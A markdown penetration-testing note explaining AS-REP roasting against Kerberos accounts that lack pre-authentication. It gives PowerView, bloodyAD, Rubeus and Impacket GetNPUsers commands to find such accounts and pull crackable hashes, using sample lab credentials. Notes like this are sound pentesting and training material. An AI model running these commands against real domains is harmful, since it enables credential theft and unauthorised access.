# Content

# Roasting attacks

## AS-REQ Roasting
- AS-REQ Roasting is possible when Kerberos pre-authentication is not configured. This allows anyone to request authentication data for a user. In return, the KDC would provide an AS-REP message. 
- Since part of that message is encrypted using the user’s password, it is possible to perform an offline brute-force attack to try and retrieve the user's password.
- The only information an attacker requires is the username they want to attack, which can also be found using other enumeration techniques.


it's possible to obtain the TGT for any account that has the "Do not require Kerberos preauthentication" setting enabled.
![Screenshot 2024-06-18 at 12-41-52 8 Powerful Kerberos attacks (that analysts hate)](https://github.com/kiro6/penetration-testing-notes/assets/57776872/ebe87f88-c284-4848-ae60-bf1cedd3316c)


### Enumerating vulnerable users (need domain credentials)
```shell
# windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView

# Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName  
```

### Request AS_REP message
```
# Windows 
## Rubeus 
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]

## From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
Get-ASREPHash -Username VPN114user -verbose 

# Linux
## Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast

##Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
